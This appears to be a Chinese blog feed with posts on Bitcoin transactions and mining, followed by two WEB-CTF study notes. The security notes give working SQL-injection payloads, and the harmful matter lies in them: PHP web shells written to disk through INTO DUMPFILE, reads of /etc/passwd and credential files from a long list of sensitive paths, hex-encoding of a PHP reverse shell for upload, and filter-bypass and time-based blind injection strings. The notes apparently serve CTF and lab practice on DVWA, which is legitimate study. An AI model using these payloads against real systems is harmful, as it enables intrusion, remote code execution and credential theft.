<li><strong>输出列表</strong> :块中的第一个交易的输出是挖矿所得，一般是矿工自己的钱包地址</li>
<li><strong>锁定时间</strong> :如果非0并且序列号小于0xFFFFFFFF，是指块序号；如果交易已经终结，则是指时间戳（4字节）</li>
</ul>
<p><strong>版本</strong>是明确一笔交易参照的规则，除非有重大升级的情况下，版本号基本无变化，是比较固定的一个值。<br><strong>锁定时间</strong>是被该交易被加到区块的最早时间，在大多数的情况下他的值都是0，表示需要立即被加入区块中。如果锁定时间大于0而小于5亿，它的值就表示区块高度。如果大于5亿就表示一个Unix时间戳。<br>以下详细说明<strong>输入输出列表</strong>：<br>一个简单的交易输入如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Input:</div><div class="line">Previous tx: f5d8ee39a430901c91a5917b9f2dc19d6d1a0e9cea205b009ca73dd04470b9a6</div><div class="line">Index: 0</div><div class="line">scriptSig: 304502206e21798a42fae0e854281abd38bacd1aeed3ee3738d9e1446618c4571d10</div><div class="line">90db022100e2ac980643b0b82c0e88ffdfec6b64e3e6ba35e7ba5fdd7d5d6cc8d25c6b241501</div></pre></td></tr></table></figure></p>
<p>先说明，每一笔交易的每一个输入都要指定是之前存在的哪一笔交易的哪一个输出（即从何处得到的钱）<br>那么看以上的结构，首先是前一笔交易的哈希值（Previous tx），然后是花费的是第几个输出（Index）也叫索引，通过交易Hash和索引（从0开始），即可唯一确定一个未花费的交易输出——UTXO（Unspent Transaction Output）。这样，每一个Tx Input都和之前的某个Tx Output关联了起来。<br>最后是解锁脚本（scriptSig），解锁脚本存在的意义在于验证成立这笔交易的人有权利使用他指定的UTXO。其中解锁脚本=签名+公钥，公钥是该比特币花费者的公钥，签名是对当前这笔交易的更改信息作为message的以私钥进行的签名</p>
<p>一个简单的交易输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Output:</div><div class="line">Value: 5000000000</div><div class="line">scriptPubKey: OP_DUP OP_HASH160 404371705fa9bd789a2fcd52d2c580b65d35549d</div><div class="line">OP_EQUALVERIFY OP_CHECKSIG</div></pre></td></tr></table></figure></p>
<p>首先是输出金额（Value），然后是锁定脚本，锁定脚本包括脚本系统中的一系列操作符。</p>
<h3 id="交易类型"><a href="#交易类型" class="headerlink" title="交易类型"></a>交易类型</h3><p>比特币目前提供了两种不同的交易类型，如下所示。通过这两者类型的交易可以组合出更加复杂的交易，称之为合约。<br>（1）Pay-to-PubkeyHash<br>这个也是最常见的交易，目标地址就是比特币地址，花费时需要提供签名和公钥。<br>（2）Pay-to-Script-Hash（P2SH）<br>在P2SH中，目标地址由脚本哈希取代，解锁脚本中才包含签名和脚本内容。可以设定为类似解锁脚本中只需要5个公钥中任意两个私钥的签名即可。</p>
]]></content>
      
        
        <tags>
            
            <tag> 比特币 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[比特币&区块链与挖矿]]></title>
      <url>/2017/12/27/%E6%AF%94%E7%89%B9%E5%B8%81&amp;%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%8E%E6%8C%96%E7%9F%BF/</url>
      <content type="html"><![CDATA[<p>— 矿工的世界 —<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近这段时间好好学习了下比特币，但也只是初步了解了个大概，也有好多疑问没有解决。<br>根据各个地方收集到的资料，加上自己的理解，写下了这篇博客。</p>
<h2 id="比特币定义"><a href="#比特币定义" class="headerlink" title="比特币定义"></a>比特币定义</h2><p><strong>比特币</strong>是一种由开源的P2P软件产生的数字货币，是通过计算产生的，由一串串复杂的计算机代码组成。与传统的法定货币不同的是，比特币不依赖于特定的中央发行机构，而是使用遍布整个P2P网络节点的分布式数据库来记录货币的交易，并使用密码学的加密设计来确保货币流通各个环节的安全性。</p>
<h3 id="比特币总量"><a href="#比特币总量" class="headerlink" title="比特币总量"></a>比特币总量</h3><p>比特币的发行上限为2100万枚</p>
<h3 id="比特币的产生速度"><a href="#比特币的产生速度" class="headerlink" title="比特币的产生速度"></a>比特币的产生速度</h3><p>大约每10分钟可以产生出25枚比特币，产量每四年会缩减一半（2009-2012年的最初4年内，每10分钟产出50枚比特币）,因此比特币的流通数目将在2140年达到它的发行上限。</p>
<h2 id="分布式数据库"><a href="#分布式数据库" class="headerlink" title="分布式数据库"></a>分布式数据库</h2><p>分布式数据库系统通常使用较小的计算机系统，每台计算机可单独放在一个地方，每台计算机中都可能有DBMS的一份完整拷贝副本，或者部分拷贝副本，并具有自己局部的数据库，位于不同地点的许多计算机通过网络互相连接，共同组成一个完整的、全局的逻辑上集中、物理上分布的大型数据库。</p>
<ul>
<li>无发行机构（政府、个人、企业等）</li>
<li>任何人都可以挖掘、购买、出售、收取比特币</li>
<li>交易过程中外人无法识别用户身份信息</li>
<li>支付速度快1秒内完成交易，10分钟内全网节点记录、验证、确认，实现交易确认</li>
<li>点对点兑换和交易，成本为零。通过比特币交易所来兑换，支付千分之三或更少手续费</li>
</ul>
<h3 id="比特币系统中的数据库——区块和区块链"><a href="#比特币系统中的数据库——区块和区块链" class="headerlink" title="比特币系统中的数据库——区块和区块链"></a>比特币系统中的数据库——区块和区块链</h3><p>区块链是比特币的底层技术，但已经独立地发展为了一种革命性技术。比特币则是区块链最大最成功的的应用。<br>区块链是一个基于共识机制、去中心化的公开数据库。</p>
<ul>
<li><em>共识机制</em>使之在分布式系统中保证数据一致性的算法;</li>
<li><em>去中心化</em>是指参与区块链的所有节点都是权利对等的，没有高低之分，唯一的限制就是个人自己的选择。</li>
<li><em>公开数据库</em>则意味着所有人都可以看到国王的区块和交易，这也保证了无法造价和改写。</li>
</ul>
<p><strong>Block Chain(区块链)</strong>：比特币从开始到现在的每一笔产出或交易的记录文件。<a href="https://link.zhihu.com/?target=http%3A//blockchain.info/" target="_blank" rel="external">Bitcoin Block Explorer</a>可以查看<br><strong>Block(数据区块)</strong>：一个区块是部分或所有最新(未被其他先前的区块记录)比特币交易的记录集。大约10min产生一个。</p>
<p>以下给出比特币系统中的区块结构，在之后会有说明<br>数据区块结构：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fmgi0r6p5hj30n707nt99.jpg" alt="数据区块结构"><br>区块头结构：<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fmgi07kgwoj30n40b6t9u.jpg" alt="区块头结构"></p>
<h2 id="矿工的世界"><a href="#矿工的世界" class="headerlink" title="矿工的世界"></a>矿工的世界</h2><p>在p2p比特币网络中，一些节点被称为<em>专业节点矿工</em>。<br>矿工的工作：</p>
<ul>
<li>接受、验证、中继新交易</li>
<li>挖矿——开发新的区块</li>
<li>监听、验证、传播新区块</li>
</ul>
<p>矿工们在挖矿过程中会得到两种类型的奖励：</p>
<ul>
<li>创建新区块的新币奖励</li>
<li>区块中所含交易的交易费</li>
</ul>
<p>矿工的各种工作大都是<strong>同时</strong>进行的，挖矿的同时在处理交易，并一直监听是否有新的区块产生。<br>1.矿工在网络中收集被广播的比特币交易，把验证过的交易，加到自己的交易池中。根据块龄，矿工费和优先级排序交易，靠前的交易优先被记录。<br>2.当监听到新区块产生，就立刻停下工作，先去验证新的区块。验证通过，会尝试将新的区块连接到现存的区块链，将他们组装起来，并继续传播此区块，同时要将新区块中对应的交易从交易池中移除，确保任何留在内存池中的交易都是未确认的。<br>3.当自己挖到一个新区块，就立刻将新区块发送给相邻节点。<br><em>新区块象征着本轮区块竞争的结束，也是下一轮竞争的开始。</em></p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fmvfzl1rqsj30ap0g9gmt.jpg" alt="矿工的工作"></p>
<h3 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h3><p>通过开源的计算方法在比特币特定的数据链上运算正确的比特币数据区块的行为，产生比特币的唯一途径。<br>挖矿三个重要功能：</p>
<ol>
<li>维系货币的支付功能(对于比特币系统的最主要功能)</li>
<li><p>通过算力保障系统安全（防止“双重支付”）</p>
<blockquote>
<p>双重支付:2次或多次花费同一笔比特币</p>
</blockquote>
</li>
<li><p>发行新的货币(总量达到之前)</p>
</li>
</ol>
<h3 id="挖矿算法"><a href="#挖矿算法" class="headerlink" title="挖矿算法"></a>挖矿算法</h3><p>区块头参数：</p>
<ul>
<li><strong>version</strong>：版本号</li>
<li><strong>prev_hash</strong>: 上一个Block(父区块)的hash值</li>
<li><strong>merkle_root</strong>：这个区块中全部交易构成的<a href="http://blog.csdn.net/wo541075754/article/details/54632929" target="_blank" rel="external">merkle树的根</a> (为了防止有交易出现在倒数第二层，如果当前交易数量是奇数的话，那么最后一个交易将会被计算两次哈希值)</li>
<li><strong>ntime</strong>：区块生成的时刻（以Unix纪元开始到当下的秒数，精确到秒）（每几秒更新） </li>
<li><strong>nbits</strong>: 当前运算难度，最终反应结果为TARGET的</li>
<li><strong>X</strong>：正确运算结果的唯一参数，范围是0~2^32</li>
<li><strong>TARGET</strong>: 比特币系统要求新的哈希值拥有特定的格式——必须以一串特定数量的0开头</li>
</ul>
<p><strong>挖矿算法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SHA256(SHA256(version + prev_hash + merkle_root + ntime + nbits + x)) &lt; TARGET</div></pre></td></tr></table></figure></p>
<p>对区块头进行哈希运算，将所得哈希值与目标哈希值进行比较，如果当前X值计算的哈希值小于目标哈希值，则挖矿成功。如果这个哈希值不小于目标值，矿工就会修改这个X（通常将之加1）然后再试。</p>
<h4 id="Q1-如何保证区块更新周期平均是10min？"><a href="#Q1-如何保证区块更新周期平均是10min？" class="headerlink" title="Q1. 如何保证区块更新周期平均是10min？"></a>Q1. 如何保证区块更新周期平均是10min？</h4><p>nbits越大，TARGET越小，解出X的难度越大。<code>target=2**（256-nbits）</code><br>难度值nbits是节点自动调整的。<br><code>New nbits= Old nbits*（Actual time of last 2016 Blocks/ 20160 minutes）</code><br>（即最新2016个区块花费时长与20160分钟（2周）比较所得，期望10min产生一个）</p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fmvgw88o5cj30mw0aywed.jpg" alt="区块的链接"></p>
<h3 id="区块成熟时间-Maturation-Time"><a href="#区块成熟时间-Maturation-Time" class="headerlink" title="区块成熟时间(Maturation Time)"></a>区块成熟时间(Maturation Time)</h3><p><strong>区块成熟时间</strong>是指矿工产生一个新区块得到25BTC收益后，要等过了100个块后，才能使用这些币。这个100区块时间，即收到100个确认的时间，就是区块成熟时间。<br><em>为什么要设这个时间？</em><br>如果这个区块在分叉时变成了孤立区块，25个BTC的收益将消失，如果矿工挖到比特币后可以马上花掉，就会造成后续的一系列接收者损失比特币，因而设定了100个确认的限制，在这之后产生分叉的可能性非常小，即使产生分叉，也只会影响矿工收益，不会影响到其他人。</p>
<h4 id="Q2-是否有可能同时解出区块-？"><a href="#Q2-是否有可能同时解出区块-？" class="headerlink" title="Q2. 是否有可能同时解出区块 ？"></a>Q2. 是否有可能同时解出区块 ？</h4><p> 当两个区块产生的时间仅相差几秒时，可能会产生包含一个区块的分叉。</p>
<h4 id="Q3-同时解出来怎么办-？"><a href="#Q3-同时解出来怎么办-？" class="headerlink" title="Q3. 同时解出来怎么办 ？"></a>Q3. 同时解出来怎么办 ？</h4><p>短暂产生两个分支，矿工节点会根据收到区块的时间，在先收到的区块基础上继续挖矿。哪个区块的后续区块先出现，这个区块就被包括进主链，因为这条块链更长，所有人都会选择这个更长的分支。没选中的区块的矿工，所得比特币无效，其区块中包含的交易也无效(虽然这种交易的无效是暂时的，这些交易会被重新广播投入到交易池中被新的区块重新记录，但是此处引起双重支付的可能)。</p>
<h4 id="Q4-如何实现双重支付-？"><a href="#Q4-如何实现双重支付-？" class="headerlink" title="Q4. 如何实现双重支付 ？"></a>Q4. 如何实现双重支付 ？</h4><p>在目前公认的数据链上完成交易确认，然后延续另一条数据链，使之成为新的被公认的数据链，则原来被公认的数据块的交易不被承认，在交易重新被认可之前，抢先完成同一笔钱的另一个交易确认，这笔交易就会因为账单中指定地方的钱已经被使用了而作废，但是对方的交易物品已经发送。<br>比如：挖到新的BLOCK不广播，比特币消费给A，继续挖，抢先到达2个区块，前后广播，所有人会以你这个更长的分支为当前的数据链。A收到的比特币不被承认，再消费一次比特币，关于A的账单因为比特币不足作废。<br>解决办法：收款人不要在交易确认后（及产生一个新的区块后）立刻发出货物（实现交易），而是应该在看一段时间，等待基于这个区块的新生成的区块达到6个，并且之前的账簿没有被取消，才确认钱已经到账（你的交易所在的区块链足够强壮）。<br>当整个网络算力足够高，攻击概率极低，或成本极大。</p>
<h4 id="Q4-难度是节点自己自动调控的，是否可以人为利用低难度去产生长分支区块？"><a href="#Q4-难度是节点自己自动调控的，是否可以人为利用低难度去产生长分支区块？" class="headerlink" title="Q4. 难度是节点自己自动调控的，是否可以人为利用低难度去产生长分支区块？"></a>Q4. 难度是节点自己自动调控的，是否可以人为利用低难度去产生长分支区块？</h4><p>客户端接受“最长”块链作为有效链，整条块链的“长度”是指具有最大难度的链，而不是指具有最多区块数量的块链，可防止某些人创建大量低难度区块，故意使块链分叉，并且让网络接受它成为“最长”的块链。</p>
<h4 id="Q5-？？？矿工节点会在先收到的区块上继续挖矿，还是根据区块头中的时间戳来替换？？？"><a href="#Q5-？？？矿工节点会在先收到的区块上继续挖矿，还是根据区块头中的时间戳来替换？？？" class="headerlink" title="Q5. ？？？矿工节点会在先收到的区块上继续挖矿，还是根据区块头中的时间戳来替换？？？"></a>Q5. <strong>？？？</strong>矿工节点会在先收到的区块上继续挖矿，还是根据区块头中的时间戳来替换<strong>？？？</strong></h4><p>这个问题不是很确定，个人觉得是在先收到的区块上挖矿。这样子对于矿工工作合理一些，但是如此区块头中的时间戳貌似用处也不大。</p>
<h4 id="Q5-？？？区块头中上一个区块的hash，是上一个区块全部的hash还是上一个区块头的hash？？？"><a href="#Q5-？？？区块头中上一个区块的hash，是上一个区块全部的hash还是上一个区块头的hash？？？" class="headerlink" title="Q5. ？？？区块头中上一个区块的hash，是上一个区块全部的hash还是上一个区块头的hash？？？"></a>Q5. <strong>？？？</strong>区块头中上一个区块的hash，是上一个区块全部的hash还是上一个区块头的hash<strong>？？？</strong></h4><p>也不是很确定，说两者的都有，个人觉得是上一个区块头的hash，因为区块头包括交易的merkle树的根，已经做到与交易绑定。</p>
<p>参考：<br>《比特币开发》——申屠青春<br><a href="https://www.jianshu.com/p/b8a0c43d0176" target="_blank" rel="external">比特币:交易的数据结构-姜家志</a><br><a href="https://www.liaoxuefeng.com/article/001482718603696a6b6eb2bebc74211ab967146a952ae0c000" target="_blank" rel="external">深入理解比特币交易的脚本</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 比特币 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的SQL文件操作]]></title>
      <url>/2017/12/05/WEB-CTF%E4%B8%AD%E7%9A%84SQL%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      <content type="html"><![CDATA[<p>—  从零开始的笔记  —<br>— sql文件操作及过滤 —<br><a id="more"></a></p>
<h2 id="SQL文件操作"><a href="#SQL文件操作" class="headerlink" title="SQL文件操作"></a>SQL文件操作</h2><p>以下windows操作可以在phpstudy的dvwa上复现，linux操作可以在Metasploitable2的dvwa上复现。</p>
<h3 id="读取文件-load-file"><a href="#读取文件-load-file" class="headerlink" title="读取文件 load_file"></a>读取文件 load_file</h3><p>读取文件前提：</p>
<ul>
<li>文件必须位于服务器主机上</li>
<li>必须指定完整路径的文件</li>
<li>必须有FILE权限 </li>
<li>文件内容必须小于max_allowed_packet （show VARIABLES like ‘%max_allowed_packet%’; 查看）</li>
</ul>
<p>使用格式：<strong>load_file(‘路径’)</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#windows</span></div><div class="line">select load_file(<span class="string">'d:/kali.txt'</span>)             <span class="comment">#路径为单引号Str，斜杠是/而不是\</span></div><div class="line">select load_file(0x643a2f6b616c692e747874)  <span class="comment">#路径为0x16进制Str</span></div><div class="line">select load_file(char(99,58,47,98....))     <span class="comment">#路径为char转换的字符</span></div><div class="line"><span class="comment">#linux</span></div><div class="line">select load_file（<span class="string">'/etc/passwd'</span>）</div></pre></td></tr></table></figure></p>
<p><strong>关于过滤：</strong><br>防止文件中有截断：hex(load_file(‘文件地址’))</p>
<h3 id="写入文件-INTO-DUMPFILE"><a href="#写入文件-INTO-DUMPFILE" class="headerlink" title="写入文件 INTO DUMPFILE"></a>写入文件 INTO DUMPFILE</h3><p>使用格式：<strong>“内容” INTO DUMPFILE “路径”</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#windows</span></div><div class="line">select <span class="string">"&lt;?php system(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span> INTO DUMPFILE <span class="string">"D:/PHP/WWW/cmd.php"</span></div><div class="line"><span class="comment">#linux</span></div><div class="line">select <span class="string">"&lt;?php passthru(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span> INTO DUMPFILE <span class="string">"/var/www/a.php"</span>  </div><div class="line"> <span class="comment">#下一条默认保存在/var/lib/mysql/dvwa/a.php （默认保存路径根据系统用户而定）</span></div><div class="line"> <span class="comment">#（/var/lib/mysql 是 mysql的主目录，dvwa是SQL注入漏洞的网站主目录）</span></div><div class="line">select <span class="string">"&lt;?php passthru(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span> INTO DUMPFILE <span class="string">"a.php"</span>       </div><div class="line">select <span class="string">"&lt;?php passthru(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span> INTO DUMPFILE <span class="string">"/tmp/a.php"</span></div></pre></td></tr></table></figure></p>
<p>因为Linux用户之间的读取，写入，执行权限严格。<br>假设做数据库写入文件操作的用户为MYSQL，而网站目录的用户为WWW。</p>
<ul>
<li>第一种情况，mysql用户不能往WWW用户的目录写入文件，我们就无法访问木马文件，从而不能利用。写入无效。</li>
<li>第二种情况，dvwa目录只有mysql用户和root有权限，www无法进入读写，所以mysql植入木马，www网站也没有权限访问木马。写入成功，执行无效</li>
<li>第三种情况，tmp目录为所有用户都可以访问的目录（mysql 可以写入，www 可以读出），此时www用户通过文件包含漏洞去“执行”木马<br>ps.(文件包含漏洞是读取文件进来执行，不是真正的需要对文件执行权限)</li>
</ul>
<p>此外，还可以查询数据存至目标主机，再加以利用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select concat(user,0x3a,password) from users INTO OUTFILE <span class="string">'/tmp/a.db'</span></div></pre></td></tr></table></figure></p>
<p><strong>关于过滤：</strong><br>文件转为16进制（INTO DUMPFILE会自动变为正常字符保存）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cat php-reverse-shell.php | xxd -ps     </div><div class="line"><span class="comment">#用xxd进行16进制显示，但是每一行长固定，后面有换行符，sql无法翻译</span></div><div class="line">cat php-reverse-shell.php | xxd -ps | tr -d <span class="string">'\n'</span>    用xxd进行16进制显示，删除换行符</div><div class="line">ps. php-reverse-shell.php 木马文件太大 url长度限制 无法上传 可换小型php木马</div><div class="line">	<span class="string">' union select null,(空格)(0xcccccc) INTO DUMPFILE "/tmp/1.php" --+</span></div><div class="line"><span class="string">ps. 注意 文件16进制编码填入cccccc</span></div></pre></td></tr></table></figure></p>
<h3 id="常用路径"><a href="#常用路径" class="headerlink" title="常用路径"></a>常用路径</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">#查看系统版本</div><div class="line">    c:/boot.ini</div><div class="line">#php配置信息</div><div class="line">    c:/windows/php.ini</div><div class="line">#MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</div><div class="line">    c:/windows/my.ini</div><div class="line">    c:/winnt/php.ini</div><div class="line">    c:/winnt/my.ini</div><div class="line">#存储了mysql.user表中的数据库连接密码</div><div class="line">    c:\mysql\data\mysql\user.MYD </div><div class="line">#存储了虚拟主机网站路径和密码</div><div class="line">    c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini </div><div class="line">    c:\Program Files\Serv-U\ServUDaemon.ini</div><div class="line">#查看IIS的虚拟主机配置</div><div class="line">    c:\windows\system32\inetsrv\MetaBase.xml </div><div class="line">#存储了WINDOWS系统初次安装的密码</div><div class="line">    c:\windows\repair\sam </div><div class="line">#6.0版本以前的serv-u管理员密码存储于此</div><div class="line">    c:\Program Files\ Serv-U\ServUAdmin.exe </div><div class="line">    c:\Program Files\RhinoSoft.com\ServUDaemon.exe</div><div class="line">#存储了pcAnywhere的登陆密码</div><div class="line">    C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</div><div class="line">#查看WINDOWS系统apache文件</div><div class="line">    c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf</div><div class="line">#查看jsp开发的网站 resin文件配置信息.</div><div class="line">    c:/Resin-3.0.14/conf/resin.conf </div><div class="line">#查看linux系统配置的JSP虚拟主机</div><div class="line">    c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf </div><div class="line">    d:\APACHE\Apache2\conf\httpd.conf</div><div class="line">    C:\Program Files\mysql\my.ini</div><div class="line">#存在MYSQL系统中的用户密码</div><div class="line">    C:\mysql\data\mysql\user.MYD</div></pre></td></tr></table></figure>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">#apache2缺省配置文件</div><div class="line">    /usr/local/app/apache2/conf/httpd.conf </div><div class="line">    /usr/local/apache2/conf/httpd.conf</div><div class="line">#虚拟网站设置</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf </div><div class="line">#PHP相关设置</div><div class="line">    /usr/local/app/php5/lib/php.ini </div><div class="line">#从中得到防火墙规则策略</div><div class="line">    /etc/sysconfig/iptables </div><div class="line">#apache配置文件</div><div class="line">    /etc/httpd/conf/httpd.conf</div><div class="line">#同步程序配置文件</div><div class="line">    /etc/rsyncd.conf </div><div class="line">#mysql的配置文件</div><div class="line">    /etc/my.cnf </div><div class="line">#系统版本</div><div class="line">    /etc/redhat-release </div><div class="line">    /etc/issue</div><div class="line">    /etc/issue.net</div><div class="line">#PHP相关设置</div><div class="line">    /usr/local/app/php5/lib/php.ini</div><div class="line">#虚拟网站设置</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf </div><div class="line">#查看linux APACHE虚拟主机配置文件</div><div class="line">    /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf </div><div class="line">#针对3.0.22的RESIN配置文件查看</div><div class="line">    /usr/local/resin-3.0.22/conf/resin.conf</div><div class="line">    /usr/local/resin-pro-3.0.22/conf/resin.conf </div><div class="line">#APASHE虚拟主机查看</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf </div><div class="line">#查看linux APACHE虚拟主机配置文件</div><div class="line">    /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf </div><div class="line">#针对3.0.22的RESIN配置文件查看</div><div class="line">    /usr/local/resin-3.0.22/conf/resin.conf </div><div class="line">    /usr/local/resin-pro-3.0.22/conf/resin.conf</div><div class="line">#APASHE虚拟主机查看</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf</div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的绕过]]></title>
      <url>/2017/10/19/WEB-CTF%E4%B8%AD%E7%9A%84%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<p>—  从零开始的笔记  —<br>— sql，上传，目录  —<br><a id="more"></a></p>
<hr>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
<li>url base64 utf-8… (全部编码或个别编码)</li>
<li>字符–&gt;char()  如：Test  –&gt; CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</li>
</ul>
<h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3><p>admin  —&gt;  adadminmin<br>admin  —&gt;  adminadmin</p>
<h3 id="大小写混用"><a href="#大小写混用" class="headerlink" title="大小写混用"></a>大小写混用</h3><p>SeLeT   不多解释</p>
<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul>
<li>两个空格代替一个空格，TAB代替空格</li>
<li>用注释符号代替空格 /**/</li>
<li>用括号代替空格 </li>
<li>用+代替空格  </li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>=<span class="number">2</span>;   <span class="comment">---------&gt;   select(user())from dual where(1=1)and(2=2)</span></div><div class="line">利用函数完成猜解  如：  猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟</div><div class="line">	http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109))</div></pre></td></tr></table></figure>
<ul>
<li>select+user()  +代替空格  不是url编码空格的+而是直接的+</li>
</ul>
<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><ul>
<li>=用<a href="http://www.runoob.com/mysql/mysql-like-clause.html" target="_blank" rel="external">like</a>代替</li>
<li>需要与零比较：<code>-1 or 1=1 and ord(substr(user(),1,1))-114</code></li>
</ul>
<h3 id="Mysql条件注释的利用-…"><a href="#Mysql条件注释的利用-…" class="headerlink" title="Mysql条件注释的利用  /! … /"></a>Mysql条件注释的利用  /<em>! … </em>/</h3><ul>
<li><strong>/<em>! … </em>/</strong>:其中的语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。</li>
<li><strong>/<em>!50000select</em>/</strong>:50000版本以上的  不执行括号中的语句 ，必定执行，用于过滤正则表达式</li>
</ul>
<h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><ul>
<li><strong>limit ,</strong>中的<strong>,</strong> ：<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset</a></li>
<li>substr() mid()等函数中的<strong>,</strong> ：<code>select substr(database() from 1 for 1);</code></li>
</ul>
<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>使用十六进制可以绕过引号<br>如：”users” —&gt; 0x7573657273</p>
<h3 id="过滤-lt-与-gt"><a href="#过滤-lt-与-gt" class="headerlink" title="过滤&lt;与&gt;"></a>过滤&lt;与&gt;</h3><p>使用<a href="http://www.yiibai.com/sql/sql_function_greatest.html" target="_blank" rel="external">GREATEST()</a>绕过比较操作符。<br><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code> ——-&gt;<br><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></p>
<h3 id="过滤sleep"><a href="#过滤sleep" class="headerlink" title="过滤sleep"></a>过滤sleep</h3><p><a href="http://blog.sina.com.cn/s/blog_778e18e90101a48h.html" target="_blank" rel="external">benchmark(x, y)</a><br>benchmark(1000,sha(1)) 1000次sha(1)，来时间延迟  </p>
<h3 id="过滤注释符号（-，–）"><a href="#过滤注释符号（-，–）" class="headerlink" title="过滤注释符号（#，–）"></a>过滤注释符号（#，–）</h3><ul>
<li>id=1’ union select 1,2,3||’1</li>
<li>id=1’ union select 1,2,’3</li>
</ul>
